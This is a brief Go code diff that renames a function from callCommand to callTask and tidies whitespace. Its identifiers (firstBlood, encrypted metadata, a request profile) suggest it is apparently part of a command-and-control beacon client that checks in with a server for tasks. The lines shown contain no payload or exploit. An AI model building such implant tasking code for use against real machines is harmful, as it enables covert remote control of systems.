@@ -31,9 +31,7 @@ func firstBlood(enc *encrypt.Enc, mt *metadata.Metadata, r *requester.ReqProfile
 	return true, nil
 }
 
-
-
-func callCommand(mt *metadata.Metadata, r *requester.ReqProfile) (*http.Response, error) {
+func callTask(mt *metadata.Metadata, r *requester.ReqProfile) (*http.Response, error) {
 	resp, err := r.Get(mt.EncMetadata)
 	if err != nil {
 		return nil, err
